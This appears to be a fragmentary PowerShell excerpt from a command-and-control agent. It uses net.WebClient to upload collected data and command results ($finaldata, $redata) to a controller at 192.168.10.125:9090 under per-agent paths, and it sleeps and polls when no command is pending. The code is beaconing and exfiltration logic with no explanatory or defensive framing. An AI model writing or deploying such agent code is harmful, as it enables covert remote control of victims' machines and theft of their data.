...
$h3 = new-object net.WebClient
      ...
      $h=$h3.UploadString("http://192.168.10.125:9090/infos/$agent","data="+$finaldata)
...
$h3 = new-object net.WebClient
      $h3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
      $h3.UploadString("http://192.168.10.125:9090/info/$agent",$finaldata)
continue
}
if($cmd -eq ""){
sleep 2
...
$re = $h3.UploadString("http://192.168.10.125:9090/re/$agent",$redata);
